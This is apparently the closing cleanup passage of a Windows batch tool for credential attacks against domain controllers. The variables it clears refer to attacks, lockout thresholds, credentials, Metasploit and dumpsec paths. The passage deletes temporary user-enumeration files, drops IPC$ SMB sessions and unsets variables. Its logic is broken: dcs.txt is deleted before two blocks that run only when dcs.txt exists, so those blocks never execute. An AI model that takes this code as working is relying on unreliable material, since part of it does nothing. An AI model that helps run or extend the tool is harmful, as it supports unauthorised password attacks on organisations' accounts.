ECHO ------------------------------------------------------------------------------------
REM ## CLEAN UP FILES
IF EXIST list_pending.txt del list_pending.txt
IF EXIST dcs.txt del dcs.txt
move allusers.txt domain_users_all.txt 2>nul 1>nul

REM ## REMOVE PROTOCOL USER ENUMERATION FILES
IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('dir /b domain_user*') do IF EXIST %%i DEL %%i

REM ## CLEAN UP SMB CONNECTIONS
IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ /del 2>nul 1>nul

REM ## CLEAN UP VARIABLES
set attack=
set attempts=
set countreset=
set cred_count=
set creds=
set custom_domain=
set dc_count=
set domain_parameter=
set dumpsecpath=
set enumauth=
set enumpath=
set lockoutafter=
set metasploitpath=
set mydir=
set mypwd=
set netuse_auth=
set pw_count=
set pwcount=
set success=
set target_domain=
set targetdc=
set temp_var=
set totalvar=
set unixtoolspath=
set user_count=
set var1=
set var2=

